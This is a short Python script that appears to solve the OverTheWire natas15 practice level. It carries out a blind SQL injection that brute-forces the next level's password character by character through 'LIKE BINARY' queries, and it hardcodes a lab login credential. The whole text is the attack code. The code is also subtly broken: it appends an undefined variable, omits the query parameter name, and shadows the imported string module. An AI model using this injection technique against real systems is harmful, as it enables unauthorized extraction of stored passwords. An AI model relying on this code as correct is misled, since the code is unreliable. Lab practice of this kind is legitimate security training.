import requests
import string

dic=''.join([string.ascii_letters, string.digits])
url = 'http://natas15.natas.labs.overthewire.org/index.php'
username = "natas15"
pswd = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"
password = ''
exists = "This user exists"

for i in range(1,64):
	for j in dic:
		testString = password + j
		string = 'natas16" AND password LIKE BINARY "'+testString+'%'
		uri= ''.join([url,'?',string])
		res = requests.get(uri, auth=(username,pswd))
		print(res)
		if exists in res.text:
			password += char
			print(password)

print(password)

"""
string = 'natas16 AND password LIKE BINARY T%'
print(string)
uri= ''.join([url,'?',string,'&debug'])
res = requests.post(uri, auth=(username,pswd))
print(res.text)"""

